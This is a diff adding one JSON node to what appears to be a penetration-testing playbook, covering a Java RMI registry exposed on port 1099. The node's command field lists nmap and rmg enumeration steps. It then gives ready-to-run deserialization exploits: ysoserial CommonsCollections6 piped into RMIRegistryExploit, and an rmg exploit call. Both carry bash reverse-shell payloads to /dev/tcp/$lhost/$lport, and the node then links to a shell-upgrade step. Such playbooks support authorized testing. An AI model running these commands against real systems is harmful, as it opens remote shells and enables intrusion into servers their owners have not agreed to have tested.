@@ -1,0 +1,18 @@
+{
+  "id": "java_rmi",
+  "phase": "RECON",
+  "title": "Java RMI (1099)",
+  "body": "Exposed Java RMI registry is often exploitable via deserialization. ysoserial generates payloads for common gadget chains.",
+  "cmd": "nmap -p 1099 --script rmi-dumpregistry $ip\nnmap -p 1099 --script rmi-vuln-classloader $ip\n\n# Enumerate RMI registry\nrmg enum $ip 1099\n\n# ysoserial payload generation\n# Find the right gadget chain — try CommonsCollections first\njava -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i,>&,/dev/tcp/$lhost/$lport,0>&1}' | \\\n  java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit $ip 1099 CommonsCollections6 \\\n  'bash -c {bash,-i,>&,/dev/tcp/$lhost/$lport,0>&1}'\n\n# remote-method-guesser (rmg) for modern exploitation\nrmg exploit $ip 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$lhost/$lport<&1'",
+  "warn": "Gadget chain depends on classpath — try CommonsCollections1-7, Spring, Groovy.",
+  "choices": [
+    {
+      "label": "Got shell via deserialization",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Registry accessible — searchsploit version",
+      "next": "searchsploit_web"
+    }
+  ]
+}
